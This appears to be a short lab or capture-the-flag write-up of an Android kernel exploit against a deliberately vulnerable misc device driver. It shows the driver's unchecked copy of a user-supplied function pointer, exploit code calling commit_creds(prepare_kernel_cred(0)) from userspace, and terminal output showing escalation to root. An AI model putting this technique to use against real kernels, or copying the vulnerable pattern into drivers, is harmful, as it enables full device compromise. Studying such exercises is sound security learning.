This is about is as easy as a kernel exploit as you get.  It saves a command handler from a user via a misc device ioctl.  This command handler is later run under a different ioctl command.

The idea here is that we are going to store a command handler in the kernel whose run_handler points to a userspace function.  When we trigger the running of the handler, it will will execute our code in userspace under the kernel context.

The handler is initialized with a function that does nothing:

```c
CommandHandler handler = {
  .runHandler = &doNothingIntializer
};
```


Here we are taking user input and storing it the command handler 

```c
ssize_t write_to_vuln_device(struct file *filp, const char * buf, size_t count, loff_t *f_pos)
{
  int ret = copy_from_user(&handler,buf,sizeof(CommandHandler));
```

The ioctl which will use to trigger the execution of our command handler is:

```c
long device_ioctl(struct file *filp,
                  unsigned int cmd,
                  unsigned long arg)
{
  switch (cmd) {
    case RUN_COMMAND_HANDLER:
       handler.runHandler();
       break;
```


So, let's create our own function and run handler:

```c
int run_handler()
{
  commit_creds(prepare_kernel_cred(0));
  return 0;
}


  CommandHandler ch =  {
   .runHandler = &run_handler
  };

```


```cmd_handler``` is the open file descriptor of our misc device.

We'll write the command handler to the misc device:
```c
int rc = write(cmd_handler, &ch, sizeof(CommandHandler));
```

Now we just need to trigger the execution of the handler via the ioctl:
```c
rc = ioctl(cmd_handler, RUN_COMMAND_HANDLER, NULL);
```


Boom!

```
shell@hammerhead:/data/local/tmp $ id
uid=2000(shell) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats) context=u:r:shell:s0
shell@hammerhead:/data/local/tmp $ ./solution                                  
[+] resolved symbol commit_creds to 0xc01bac14
[+] resolved symbol prepare_kernel_cred to 0xc01bb404
[+] RunHandler at 0x815d
uid=0, euid=0
shell@hammerhead:/data/local/tmp # id
uid=0(root) gid=0(root) context=u:r:kernel:s0
```
